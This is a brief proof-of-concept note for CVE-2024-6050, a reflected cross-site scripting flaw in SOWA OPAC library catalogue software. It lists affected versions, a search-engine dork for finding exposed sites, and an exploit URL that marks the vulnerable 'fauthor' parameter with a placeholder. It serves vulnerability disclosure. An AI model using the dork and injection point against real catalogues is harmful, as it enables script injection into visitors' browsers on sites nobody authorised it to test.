# CVE-2024-6050
Reflected XSS in SOWA OPAC
Version: from 4.0 before 4.9.10, from 5.0 before 6.2.12.
`intext:"SOWA OPAC v."`

## PoC

```
https://[domain]/index.php?KatID=0&typ=repl&plnk=q__*&fauthor=[XSS]
```
